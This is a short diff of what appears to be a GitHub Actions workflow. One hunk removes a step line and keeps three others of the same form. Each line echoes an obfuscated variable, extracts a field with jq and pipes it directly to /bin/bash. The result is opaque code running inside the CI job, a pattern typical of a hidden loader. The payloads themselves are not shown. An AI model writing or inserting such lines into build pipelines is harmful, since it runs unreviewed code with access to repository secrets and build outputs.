@@ -27,7 +27,6 @@ jobs:
           echo $dktay431 | jq -r .xbta68966 | /bin/bash
           echo $oaml90202 | jq -r .t119 | /bin/bash
           echo $hr8 | jq -r .pu6 | /bin/bash
-          echo $iy5867 | jq -r .wriyi892 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
